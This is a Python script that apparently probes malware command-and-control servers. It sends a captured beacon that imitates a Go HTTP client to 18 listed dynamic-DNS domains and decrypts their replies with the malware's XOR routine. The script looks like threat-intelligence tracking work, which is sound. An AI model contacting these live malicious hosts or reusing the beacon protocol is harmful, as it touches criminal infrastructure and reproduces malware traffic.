import requests
import base64

KEY = [0xDD, 0x33, 0x99, 0xCC]
def decrypt(e):
    decode_bytes = base64.b64decode(e)
    v30 = 0
    result = []
    for i in range(len(decode_bytes)):
        v30 = KEY[i % 4] ^ decode_bytes[i] ^ v30
        result.append(v30)
        v30 = decode_bytes[i]
    return result


domains = ["vm.rotsis.r-e.kr", "ai.namutech.p-e.kr", "ot.operas.r-e.kr", "aa.olixa.p-e.kr", "bt.edgeup.r-e.kr", "uo.zosua.o-r.kr", "vn.ilnas.n-e.kr", "er.mexico.p-e.kr", "ol.negapa.p-e.kr", "qi.limsjo.p-e.kr", "main.winters.r-e.kr", "ve.kimyy.p-e.kr", "li.ssungmin.p-e.kr", "pe.daysol.p-e.kr", "ce.aerosp.p-e.kr", "ca.bananat.p-e.kr", "ar.kostin.p-e.kr", "sa.netup.p-e.kr"]

header = {"User-Agent":"Go-http-client/1.1",
          "Content-Type": "application/x-www-form-urlencoded",
          "Accept-Encoding": "gzip"
          }
payload = "a=3e53u2ZVzADd7ne7WWL7N%2FVZpib%2FEfAJeivR2gY1rGC8jxbaBzStYbyPFtoHNK1hvI8W2gc0rWG4ixLeajfHfw%3D%3D" # init

for domain in domains:
    URL = f"http://{domain}/index.php"
    try:
        print(URL)
        res = requests.post(url=URL, headers=header, data=payload)
        e = res.text
        print("Sending Payload : %s" % URL)
        print("\t- Response : %s" % e)
        d = decrypt(e)
        d = ''.join([chr(x) for x in d[60:]])
        print("\t\t- Decrypted : %s" % d)
        print()
    except:
        print("\tFailed\n")